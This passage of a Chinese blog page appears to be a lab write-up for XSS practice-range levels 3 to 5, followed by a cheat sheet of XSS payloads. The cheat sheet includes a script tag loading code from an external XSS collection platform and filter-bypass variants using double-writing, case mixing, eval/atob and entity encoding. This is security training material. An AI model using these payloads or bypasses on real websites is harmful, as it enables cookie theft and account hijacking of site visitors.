+<h2 id="2-3xss靶场第3关"><a href="#2-3xss靶场第3关" class="headerlink" title="2.3xss靶场第3关"></a>2.3xss靶场第3关</h2><p>用<script>alert(1)</script>测试一下，没被执行，打开网页源码查看<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994734059-0b387f67-6d7c-44f1-9064-e4f82f058ee9.png#averageHue=%23e7e5e5&clientId=u682cdd02-8808-4&from=paste&height=489&id=u05d64c15&originHeight=611&originWidth=952&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=67482&status=done&style=none&taskId=udcb79173-a1ba-4323-ba7e-61fcada3e96&title=&width=761.6" alt="image.png"><br>可以看到尖括号被替换成了特殊字符<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994785421-34f22865-ae90-4a44-b295-4998003579f6.png#averageHue=%23fdfaf9&clientId=u682cdd02-8808-4&from=paste&height=449&id=u103f33b7&originHeight=561&originWidth=1032&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97658&status=done&style=none&taskId=u2318b260-b91e-4d04-8276-bf81cc3b895&title=&width=825.6" alt="image.png"><br>用单引号闭合 再加上onclick&#x3D;’alert(1)’<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994912204-509b37a6-f39d-4b5e-8ada-d977610f29ad.png#averageHue=%238c8c90&clientId=u682cdd02-8808-4&from=paste&height=509&id=ubdbf9eee&originHeight=636&originWidth=981&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=62263&status=done&style=none&taskId=u16d3a7c3-25a8-4fae-ad18-7bc6ce4f456&title=&width=784.8" alt="image.png"></p>
+<h2 id="2-4xss靶场第4关"><a href="#2-4xss靶场第4关" class="headerlink" title="2.4xss靶场第4关"></a>2.4xss靶场第4关</h2><p>使用<script>alert(1)</script>测试，没被执行，查看网页源码<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721994991828-d05b04c9-9411-4027-a2c1-e4f086ea7bed.png#averageHue=%23f5f1ee&clientId=u682cdd02-8808-4&from=paste&height=505&id=u2b74b171&originHeight=631&originWidth=865&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=73263&status=done&style=none&taskId=u4af043da-cf22-4863-aee5-118e74e79c1&title=&width=692" alt="image.png"><br>可以看到尖括号没了<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995009968-4cc91515-8cfd-405e-9230-67173f28941a.png#averageHue=%23fdfcfb&clientId=u682cdd02-8808-4&from=paste&height=473&id=u01b527ee&originHeight=591&originWidth=972&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101133&status=done&style=none&taskId=u5669da8a-9744-4a1d-8db3-b920fa8d524&title=&width=777.6" alt="image.png"><br>再使用一下”onclick&#x3D;’alert(1)’<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995077609-629a13d3-2c87-4f29-8a33-b845ce83f446.png#averageHue=%2388888c&clientId=u682cdd02-8808-4&from=paste&height=476&id=u852ea1b2&originHeight=595&originWidth=951&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59500&status=done&style=none&taskId=uc0ad6223-cec3-47f2-8f80-555cb69afdc&title=&width=760.8" alt="image.png"></p>
+<h2 id="2-5xss靶场第5关"><a href="#2-5xss靶场第5关" class="headerlink" title="2.5xss靶场第5关"></a>2.5xss靶场第5关</h2><p>使用<script>alert(1)</script>测试，没被执行，查看网页源码<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995150861-3fa95651-5f8b-4716-9504-34b50a6239ee.png#averageHue=%23f1f1f0&clientId=u682cdd02-8808-4&from=paste&height=564&id=ucd312df0&originHeight=705&originWidth=963&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54815&status=done&style=none&taskId=u952ff8d9-4b0b-446d-98de-2ced9f2f1d0&title=&width=770.4" alt="image.png"><br>可以看到script被下划线分开了<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995189031-e3f765cb-0765-42ef-aa85-07bde7bccb08.png#averageHue=%23fdfbfa&clientId=u682cdd02-8808-4&from=paste&height=426&id=u4f541806&originHeight=532&originWidth=1084&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=98937&status=done&style=none&taskId=uf91a2353-5857-498c-94e8-153f6848f8f&title=&width=867.2" alt="image.png"><br>在使用一下”onclick&#x3D;’alert(1)’,结果也被分开了<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995266897-0d558497-abc8-4a08-9adb-621bd308f63b.png#averageHue=%23fcf9f8&clientId=u682cdd02-8808-4&from=paste&height=437&id=u6b0a12da&originHeight=546&originWidth=915&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=97360&status=done&style=none&taskId=u659f7904-412d-4c21-8607-cab980ff53f&title=&width=732" alt="image.png"><br>换个a标签测试”&gt;&lt;a href&#x3D;javascript:’alert(1)’&gt;<br><img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995481933-212945c3-72fd-4422-ae0a-4e46ef534c05.png#averageHue=%23f1f1f1&clientId=u682cdd02-8808-4&from=paste&height=542&id=u8bc288fe&originHeight=677&originWidth=991&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=54647&status=done&style=none&taskId=ub9684e1c-58be-46e0-aae9-30c8a0b96e9&title=&width=792.8" alt="image.png"><br>点击一下尖括号<img src="https://cdn.nlark.com/yuque/0/2024/png/40769418/1721995500971-77b6f0fa-ea2b-412b-87e9-54e3a872545b.png#averageHue=%239c9c9f&clientId=u682cdd02-8808-4&from=paste&height=692&id=u151c886c&originHeight=865&originWidth=1225&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=76821&status=done&style=none&taskId=u719491b6-7fca-4574-af7f-851d7c6b863&title=&width=980" alt="image.png"></p>
+<h1 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h1><pre><code class="java">&lt;script&gt;alert(1)&lt;/script&gt;
+&lt;script src=https://xsspt.com/VBAhTu&gt;&lt;/script&gt;
+&lt;a href= &gt;xss&lt;/a &gt;
+&lt;svg onload=alert(1)&gt;
+&lt; img src=1 onerror=alert(1)&gt;
+&lt; img src=https://www.baidu.com/img/bd_logo1.png onload=alert(1)&gt;
+&lt;details open ontoggle=alert(1)&gt;
+&lt;body onload=alert(1)&gt;
+&lt;M onmouseover=alert(1)&gt;M
+&lt;iframe src=javascript:alert(1)&gt;&lt;/iframe&gt;
+&lt;iframe onload=alert(1)&gt;
+&lt;input type=&quot;submit&quot; onfocus=alert(1)&gt;
+&lt;input type=&quot;submit&quot; onclick=alert(1)&gt;
+&lt;form&gt;&lt;input type=&quot;submit&quot; formaction=javascript:alert(1)&gt;
+&lt;!-- 上面这些都是比较常用的，那些不常用的我就没写 --&gt;
+</code></pre>
+<pre><code class="java">&lt;!-- 空格被过滤 --&gt;
+&lt;img/src=&quot;1&quot;/οnerrοr=alert(1)&gt;
+    
+&lt;!-- 双写绕过 --&gt;
+&lt;iimgmg src=1 oonerrornerror=aimglert(1)&gt;
+    
+&lt;!-- 大小写绕过  --&gt;
+&lt;iMg src=1 oNerRor=alert(1)&gt;
+    
+&lt;!-- 利用eval() --&gt;
+&lt; img src=1 onerror=&quot;a=`aler`;b=`t(1)`;eval(a+b);&quot;&gt;
+&lt; img src=1 οnerrοr=eval(atob(&#39;YWxlcnQoMSk=&#39;))&gt;
+    
+&lt;!-- 利用location --&gt;
+&lt; img src=1 οnerrοr=location=&#39;javascript:%61%6C%65%72%74%28%31%29&#39;&gt;
+&lt; img src=1 οnerrοr=location=&#39;javascript:\x61\x6C\x65\x72\x74\x28\x31\x29&#39;&gt;
+&lt; img src=1 οnerrοr=location=&quot;javascr&quot;+&quot;ipt:&quot;+&quot;%61%6C%65%72%74%28%31%29&quot;&gt;
+    
+&lt;!-- 括号被过滤 --&gt;
+&lt; img src=1 onerror=&quot;window.onerror=eval;throw&#39;=alert\x281\x29&#39;;&quot;&gt;
+    
+&lt;!-- οnerrοr=被过滤 --&gt;
+&lt; img src=1 onerror     =alert(1)&gt;
+&lt; img src=1 onerror
+=alert(1)&gt;
+    
+&lt;!-- 属性被转换为大写 --&gt;
+&lt; img src=1 onerror=&amp;#x0061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;
+    
+&lt;!-- 编码后被检测 --&gt;
+&lt; img src=1 onerror=&amp;#x00000061;&amp;#x006c;&amp;#x0065;&amp;#x0072;&amp;#x0074;&amp;#x0028;&amp;#x0031;&amp;#x0029;&gt;
+
+&lt;!-- 上面的绕过是比较常见的姿势了，下面将结合实例讲XSS的绕过&gt;
+</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 jaytp@qq.com </span>
+    </div>
+</article>
+
+
+<p>
+    <a  class="dashang" onclick="dashangToggle()">赏</a>
+</p>
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2016-2020 Yelog
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+<div class="hide_box" onclick="dashangToggle()"></div>
+<div class="shang_box">
+    <a class="shang_close"  onclick="dashangToggle()">×</a>
+    <div class="shang_tit">
+        <p>喜欢就点赞,疼爱就打赏</p>
+    </div>
+    <div class="shang_payimg">
+        <div class="pay_img">
+            <img src="/img/alipay.jpg" class="alipay" title="扫码支持">
+            <img src="/img/weixin.jpg" class="weixin" title="扫码支持">
+        </div>
+    </div>
+    <div class="shang_payselect">
+        <span><label><input type="radio" name="pay" checked value="alipay">支付宝</label></span><span><label><input type="radio" name="pay" value="weixin">微信</label></span>
+    </div>
+</div>
+
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+        $("input[name=pay]").on("click", function () {
+            if($("input[name=pay]:checked").val()=="weixin"){
+                $(".shang_box .shang_payimg .pay_img").addClass("weixin_img");
+            } else {
+                $(".shang_box .shang_payimg .pay_img").removeClass("weixin_img");
+            }
+        })
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+    function dashangToggle() {
+        $(".shang_box").fadeToggle();
+        $(".hide_box").fadeToggle();
+    }
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 18px 3px 15px 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
+        .nav-left {
+            width: 100px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 492px;
+            margin-left: -492px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
